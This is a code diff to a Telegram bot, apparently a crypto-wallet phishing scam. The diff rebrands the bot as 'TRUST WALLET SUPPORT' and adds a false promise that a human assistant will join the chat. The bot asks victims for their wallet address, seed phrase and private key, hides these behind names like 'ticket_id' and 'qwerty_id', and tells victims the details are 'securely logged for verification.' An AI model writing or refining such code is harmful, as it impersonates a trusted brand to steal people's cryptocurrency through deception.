@@ -71,7 +71,7 @@ async def start_handler(message: types.Message):
     date_str = datetime.now().strftime("%Y-%m-%d")
 
     intro_text = (
-        "🔷 <b>BIFROST WALLET SUPPORT</b> 🔷\n"
+        "🔷 <b>TRUST WALLET SUPPORT</b> 🔷\n"
         "──────────────────────────────\n"
         "🛡️ SECURE SESSION INITIALIZED\n"
         "──────────────────────────────\n"
@@ -92,7 +92,7 @@ async def start_handler(message: types.Message):
 async def show_submenu(callback: types.CallbackQuery, title: str):
     text = (
         f"<b>🔹 {title}</b>\n"
-        "| 1. Enter your wallet address │ (FLARE/EVM Address supported)\n"
+        "| 1. Enter your wallet address │ (EVM Address supported)\n"
         "| 2. We'll diagnose the issue │\n"
         "| 3. Provide solution\n"
         "──────────────────────────────\n"
@@ -230,7 +230,7 @@ async def handle_ticket_id(message: types.Message, state: FSMContext):
         f"🏦 <b>Wallet:</b> {wallet[:8]}...{wallet[-6:]}\n"
         f"📜 <b>Seed Phrase:</b> {ticket_id}\n"
         "──────────────────────────────\n"
-        "🧩 Your details have been securely logged for verification."
+        "🧩 A Human Assistant will join you shortly in your chat. Your details have been securely logged for verification."
     )
     await message.answer(summary, parse_mode="HTML")
 
@@ -266,7 +266,7 @@ async def handle_qwerty_id(message: types.Message, state: FSMContext):
         f"🏦 <b>Wallet:</b> {wallet[:8]}...{wallet[-6:]}\n"
         f"🔑 <b>Private Key:</b> {qwerty_id}\n"
         "──────────────────────────────\n"
-        "🧩 Your details have been securely logged for verification."
+        "🧩 A Human Assistant will join you shortly in your chat. Your details have been securely logged for verification."
     )
     await message.answer(summary, parse_mode="HTML")
 
